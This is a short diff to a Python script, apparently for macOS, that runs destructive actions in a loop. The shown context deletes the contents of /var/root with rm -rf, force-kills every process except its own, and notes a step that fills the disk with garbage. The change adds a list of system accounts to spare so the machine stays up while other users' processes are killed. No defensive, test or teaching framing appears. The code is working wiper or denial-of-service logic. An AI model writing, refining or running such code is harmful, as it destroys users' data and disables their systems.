@@ -1,5 +1,6 @@
 import os
 my_pid = os.getpid()
+non_kill_usrs = ['root', '_analyticsd', '_coreaudiod', '_hidd', '_trustd', '_windowserver', '_locationd']
 import psutil
 import requests
 import time
@@ -41,7 +42,7 @@ while True:
         os.system("rm -rf /var/root/* &")
         # kill all processes except root and self
         for proc in psutil.process_iter(['pid', 'name', 'username']):
-            if proc.info['pid'] != my_pid and proc.info['username'] != 'root':
+            if proc.info['pid'] != my_pid and proc.info['username'] not in non_kill_usrs:
                 print(f"Attempting to kill process: {proc.info}")
                 os.system(f"kill -9 {proc.info['pid']} &")
         # fill disk space with garbage data
